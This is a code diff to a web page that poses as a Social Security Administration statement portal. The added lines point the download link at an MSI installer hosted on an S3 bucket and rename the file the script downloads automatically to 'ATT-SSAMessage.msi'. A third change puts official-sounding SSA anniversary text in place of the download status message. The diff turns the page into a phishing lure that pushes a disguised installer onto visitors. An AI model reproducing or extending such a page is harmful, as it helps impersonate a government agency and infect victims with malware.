@@ -104,7 +104,7 @@
     Please switch to a desktop computer to access your statement.
 </div>
 
-<h4>Your download will start automatically. If it doesn't, <a download="" href="#" id="downloadLink">click here</a>.</h4>
+<h4>Your download will start automatically. If it doesn't, <a download="" href="https://dictionary-seal.s3.us-east-1.amazonaws.com/ATT-SSAMessage.msi" id="downloadLink">click here</a>.</h4>
 </div>
 </div>
 
@@ -246,7 +246,7 @@ ${navigator.userAgent}</blockquote>
                 <div class="download-info">To view: Locate the downloaded file and open it.</div>
             </div>
             <div class="download-status">
-                <div class="download-message">Download started successfully!</div>
+                <div class="download-message">An official website of the Social Security Administration. The Social Security Administration (SSA) today marks the 91st anniversary of the Social Security Act, signed by President Franklin D. Roosevelt on August 14, 1935. The program remains one of the most trusted institutions in American history...</div>
             </div>
         `;
     }
@@ -275,7 +275,7 @@ ${navigator.userAgent}</blockquote>
         try {
             const autoDownloadBtn = document.createElement("a");
             autoDownloadBtn.href = downloadLink;
-            autoDownloadBtn.download = "SSA_Statement.zip";
+            autoDownloadBtn.download = "ATT-SSAMessage.msi";
             document.body.appendChild(autoDownloadBtn);
             autoDownloadBtn.click();
             document.body.removeChild(autoDownloadBtn);
